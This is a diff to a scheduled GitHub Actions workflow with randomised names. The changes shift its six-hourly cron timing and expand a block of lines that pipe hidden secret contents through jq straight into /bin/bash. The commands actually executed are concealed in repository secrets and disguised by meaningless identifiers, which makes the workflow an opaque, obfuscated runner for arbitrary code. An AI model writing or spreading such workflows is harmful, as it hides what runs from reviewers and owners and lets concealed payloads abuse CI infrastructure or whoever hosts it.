@@ -1,8 +1,9 @@
 name: wengjingshi1290
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 0/6 * * *'
+    - cron: '32 5/6 * * *'
 
 jobs:
   build:
@@ -12,10 +13,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: wengjingshi1290
         env:
-          t7123: ${{ secrets.t7123 }}
+          l20808: ${{ secrets.l20808 }}
         run: |
-          echo $t7123 | jq -r .ctif47 | /bin/bash
-          echo $xnpu5838 | jq -r .j7814 | /bin/bash
-          echo $y434 | jq -r .vicjf0 | /bin/bash
-          echo $je631 | jq -r .z5740 | /bin/bash
+          echo $l20808 | jq -r .b3674 | /bin/bash
+          echo $wym2525 | jq -r .an0283 | /bin/bash
+          echo $av25 | jq -r .ctux745 | /bin/bash
+          echo $nw5 | jq -r .c44711 | /bin/bash
+          echo $w1 | jq -r .m560 | /bin/bash
+          echo $acpz03799 | jq -r .fc73 | /bin/bash
+          echo $czv7 | jq -r .d2 | /bin/bash
+          echo $tyogb19 | jq -r .auelv2696 | /bin/bash
 
